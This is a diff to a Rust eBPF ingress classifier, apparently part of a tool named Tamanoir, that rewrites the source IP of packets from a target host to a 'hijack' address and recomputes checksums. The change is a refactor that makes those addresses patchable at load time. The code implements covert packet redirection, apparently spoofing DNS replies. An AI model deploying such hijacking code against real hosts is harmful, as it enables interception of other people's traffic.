@@ -8,13 +8,7 @@ use network_types::{
     ip::Ipv4Hdr,
 };
 
-use crate::common::{HIJACK_IP, TARGET_IP};
-
-const IP_OFFSET: usize = EthHdr::LEN;
-const IP_CSUM_OFFSET: usize = IP_OFFSET + 10;
-const IP_SRC_ADDR_OFFSET: usize = IP_OFFSET + 12;
-const UDP_OFFSET: usize = IP_OFFSET + Ipv4Hdr::LEN;
-const UDP_CSUM_OFFSET: usize = UDP_OFFSET + 6;
+use crate::common::{HIJACK_IP, IP_CSUM_OFFSET, IP_SRC_ADDR_OFFSET, TARGET_IP, UDP_CSUM_OFFSET};
 
 #[classifier]
 pub fn tamanoir_ingress(ctx: TcContext) -> i32 {
@@ -26,22 +20,24 @@ pub fn tamanoir_ingress(ctx: TcContext) -> i32 {
 
 #[inline]
 fn tc_process_ingress(ctx: TcContext) -> Result<i32, ()> {
-    let target_ip: u32 = TARGET_IP.to_be();
-    let hijack_ip: u32 = HIJACK_IP.to_be();
+    let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
+    let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };
 
     let ethhdr: EthHdr = ctx.load(0).map_err(|_| ())?;
     if let EtherType::Ipv4 = ethhdr.ether_type {
         let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN).map_err(|_| ())?;
         let src_addr = u32::from_be(header.src_addr);
         if src_addr == target_ip {
-            let google_dns_ipv4_mut = &mut hijack_ip.to_be() as *mut u32;
+            let hijack_ip_mut = &mut hijack_ip.to_be() as *mut u32;
 
             let skb = &ctx.skb;
 
-            let ip_csum = u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).map_err(|_| ())?);
-            let udp_csum = u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).map_err(|_| ())?);
-
-            info!(&ctx, "ipcsum: {}  udpcsum: {}", ip_csum, udp_csum);
+            info!(
+                &ctx,
+                "ipcsum: {}  udpcsum: {}",
+                u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).unwrap()),
+                u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).unwrap())
+            );
 
             // recompute l3 and l4 checksums
             if let Err(err) = (*skb).l3_csum_replace(
@@ -62,16 +58,18 @@ fn tc_process_ingress(ctx: TcContext) -> Result<i32, ()> {
                 error!(&ctx, "error: {}", err);
             }
 
-            let ip_csum = u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).map_err(|_| ())?);
-            let udp_csum = u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).map_err(|_| ())?);
-
-            info!(&ctx, "ipcsum: {}  udpcsum: {}", ip_csum, udp_csum);
+            info!(
+                &ctx,
+                "=> ipcsum: {}  udpcsum: {}",
+                u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).unwrap()),
+                u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).unwrap())
+            );
 
             if unsafe {
                 bpf_skb_store_bytes(
                     skb.skb,
                     IP_SRC_ADDR_OFFSET as u32,
-                    google_dns_ipv4_mut as *const c_void,
+                    hijack_ip_mut as *const c_void,
                     4,
                     2,
                 )
